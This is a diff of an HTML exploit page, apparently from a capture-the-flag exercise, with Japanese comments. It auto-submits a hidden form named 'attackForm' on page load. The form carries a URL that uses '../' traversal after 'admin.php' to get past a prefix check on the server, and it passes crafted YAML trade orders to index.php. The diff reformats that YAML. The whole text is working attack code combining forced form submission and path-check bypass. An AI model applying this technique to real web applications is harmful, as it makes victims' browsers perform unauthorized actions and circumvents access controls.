@@ -8,15 +8,20 @@
           <input type="hidden" name="url" value="">
       </form>
       <script>
-          // YAMLデータを作成
-          const yaml = `- {amount: 1, currency: JP, op: BUY}
-  - {amount: 1000000, currency: JP, op: SELL}
-  - {amount: 1, currency: FL, op: BUY}`;
+          // より単純なYAML形式でテスト
+          const yaml = `
+  - amount: 1
+    currency: JP
+    op: BUY
+  - amount: 1000000
+    currency: JP
+    op: SELL
+  - amount: 1
+    currency: FL
+    op: BUY`;
 
-          // URL_PREFIXを満たしながらindex.phpにアクセス
           const yamlUrl = "http://localhost:5000/admin.php/../index.php?html=" + encodeURIComponent(yaml);
 
-          // フォームのurlパラメータを設定して即座に送信
           document.getElementById('attackForm').querySelector('input[name="url"]').value = yamlUrl;
           document.getElementById('attackForm').submit();
       </script>
